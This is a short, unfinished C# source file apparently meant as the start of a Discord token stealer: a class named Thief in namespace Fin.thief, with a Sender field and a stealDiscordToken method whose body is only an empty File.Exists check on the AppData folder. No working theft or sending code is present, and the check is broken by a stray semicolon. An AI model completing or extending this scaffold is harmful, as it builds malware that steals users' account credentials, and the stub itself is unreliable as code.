using System;
using System.Collections.Generic;
using System.IO;
using static System.IO.File;

namespace Fin.thief
{
    public class Thief
    {
        List<string> files = new List<string>();
        Sender _sender = new Sender();
        public Thief()
        {}
        
        public void stealDiscordToken()
        {
            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/"));

        }
    }
}